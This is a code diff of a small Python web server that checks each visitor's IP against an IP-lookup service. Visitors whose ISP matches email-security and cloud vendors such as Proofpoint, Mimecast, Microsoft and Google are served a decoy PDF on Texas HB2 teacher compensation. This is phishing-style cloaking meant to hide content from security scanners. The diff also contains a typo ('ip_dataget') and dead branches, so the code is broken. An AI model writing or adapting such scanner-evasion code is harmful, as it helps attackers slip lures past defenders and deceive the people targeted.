@@ -43,8 +43,6 @@ def initialize():
 initialize()
 
 
-# --- API Endpoints ---
-
 
 @app.get("/bot")
 def bot_info():
@@ -94,11 +92,25 @@ def get_ip_details(ip_address):
         
         }
 
-        response = requests.get(url, headers=headers).json()
-        print(response)
-        return response['hosting']
-    except Exception as e:
+        bot_indicators = ["Amazon", "AWS", "EC2", "DigitalOcean", "Microsoft", 
+                      "Outlook", "Proofpoint", "Cisco", "Google", "Azure", "Mimecast"]
+        
+        ip_data = requests.get(url, headers=headers).json()
+        print(ip_data)
+        mobile = ip_dataget('mobile', '')
+
+        isp = ip_data.get("isp", "").lower()
+        org = ip_data.get("org", "").lower()
+        for keyword in bot_indicators:
+            if keyword.lower() in isp or keyword.lower() in org:
+                return True
+
+        if mobile:
+            return False
+
         return False
+    except Exception as e:
+        return True
 
 
 
@@ -120,9 +132,6 @@ def serve(path):
     print({"visitor_ip": visitor_ip, "user_agent": user_agent}, "\n")
 
     
-
-
-
     if get_ip_details(visitor_ip):
         return send_from_directory('','89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf')
 
